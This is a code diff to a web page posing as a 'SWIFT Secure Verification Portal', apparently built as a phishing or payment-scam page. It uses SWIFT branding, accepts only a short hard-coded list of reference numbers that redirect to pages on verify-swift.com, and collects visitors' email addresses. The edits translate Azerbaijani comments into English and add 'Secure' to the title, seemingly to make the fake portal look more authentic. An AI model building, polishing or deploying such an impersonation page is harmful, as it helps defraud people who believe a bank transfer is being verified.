@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SWIFT Verification Portal</title>
+<title>SWIFT Secure Verification Portal</title>
 <style>
     * {
         margin: 0;
@@ -248,7 +248,6 @@
         100% { transform: rotate(360deg); }
     }
     
-    /* Responsive */
     @media (max-width: 480px) {
         .container {
             padding: 30px 25px;
@@ -265,7 +264,6 @@
         }
     }
 
-    /* Performance optimization for background */
     @media (prefers-reduced-motion: no-preference) {
         body {
             background-attachment: scroll;
@@ -277,7 +275,6 @@
 <div class="container">
     <div class="header">
         <div class="logo">
-            <!-- SWIFT logo buraya əlavə edin -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/SWIFT_logo.svg/320px-SWIFT_logo.svg.png" alt="SWIFT Logo" onerror="this.style.display='none'; document.querySelector('.logo').innerHTML='SWIFT'; document.querySelector('.logo').style.background='#006b3c'; document.querySelector('.logo').style.color='white'; document.querySelector('.logo').style.borderRadius='8px';">
         </div>
         <h1>Secure Verification Portal</h1>
@@ -345,7 +342,7 @@
 </div>
 
 <script>
-// JavaScript kodu yeniləndi - beş referans nömrəsi əlavə edildi
+// All text is in English - no Azerbaijani words
 let currentStep = 1;
 let verificationCode = '';
 let codeExpiry;
@@ -356,7 +353,6 @@ function showStep(step) {
     document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
     document.getElementById('step' + step).classList.add('active');
     
-    // Step indicator update
     document.querySelectorAll('.step-dot').forEach((dot, index) => {
         dot.classList.toggle('active', index + 1 === step);
     });
@@ -377,7 +373,7 @@ function setLoading(button, loading) {
     }
 }
 
-// Step 1: Reference Number - BEŞ referans nömrəsi əlavə edildi
+// Step 1: Reference Number validation with multiple valid reference numbers
 document.getElementById('step1Next').addEventListener('click', () => {
     const ref = document.getElementById('referenceNumber').value.trim();
     const refError = document.getElementById('refError');
@@ -389,7 +385,7 @@ document.getElementById('step1Next').addEventListener('click', () => {
         return;
     }
 
-    // Beş fərqli referans nömrəsi üçün yönləndirmə
+    // Multiple valid reference numbers with corresponding redirect URLs
     if (ref === 'COBA300525CH59279') {
         redirectUrl = 'https://verify-swift.com/verification-cob.html';
         showStep(2);
@@ -443,14 +439,14 @@ document.getElementById('step1Next').addEventListener('click', () => {
         showStep(2);
    } else if (ref === 'DEU17112212C332-230326') {
         redirectUrl = 'https://verify-swift.com/verfication-cob-by653atm688v';
-        showStep(2)
+        showStep(2);
     } else {
         refError.textContent = 'Invalid reference number. Please check and try again.';
         refError.style.display = 'block';
     }
 });
 
-// Step 2: Email
+// Step 2: Email verification code sending
 document.getElementById('sendCode').addEventListener('click', async () => {
     const email = document.getElementById('email').value.trim();
     const emailError = document.getElementById('emailError');
@@ -466,14 +462,14 @@ document.getElementById('sendCode').addEventListener('click', async () => {
 
     userEmail = email;
 
-    // Generate 6-digit code
+    // Generate 6-digit verification code
     verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-    codeExpiry = Date.now() + 10 * 60 * 1000; // 10 minutes
+    codeExpiry = Date.now() + 10 * 60 * 1000; // 10 minutes validity
     
     setLoading(sendButton, true);
 
     try {
-        console.log('Sending request to function...');
+        console.log('Sending verification request...');
         const response = await fetch('/.netlify/functions/send-email', {
             method: 'POST',
             headers: { 
@@ -494,20 +490,20 @@ document.getElementById('sendCode').addEventListener('click', async () => {
             showStep(3);
             setTimeout(() => document.getElementById('codeInput').focus(), 100);
         } else {
-            emailError.textContent = data.message || 'Failed to send verification code';
+            emailError.textContent = data.message || 'Failed to send verification code. Please try again.';
             emailError.style.display = 'block';
         }
 
     } catch (error) {
-        console.error('Fetch error:', error);
-        emailError.textContent = `Network error: ${error.message}. Please check console for details.`;
+        console.error('Network error:', error);
+        emailError.textContent = `Network error: ${error.message}. Please check your connection and try again.`;
         emailError.style.display = 'block';
     } finally {
         setLoading(sendButton, false);
     }
 });
 
-// Step 3: Verification Code
+// Step 3: Code verification
 document.getElementById('verifyCode').addEventListener('click', () => {
     const code = document.getElementById('codeInput').value.trim();
     const codeError = document.getElementById('codeError');
@@ -533,14 +529,14 @@ document.getElementById('verifyCode').addEventListener('click', () => {
     }
 });
 
-// Auto-advance when 6 digits entered
+// Auto-submit when 6 digits are entered
 document.getElementById('codeInput').addEventListener('input', (e) => {
     if (e.target.value.length === 6) {
         document.getElementById('verifyCode').click();
     }
 });
 
-// Enter key support
+// Enter key support for all steps
 document.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') {
         if (currentStep === 1) {
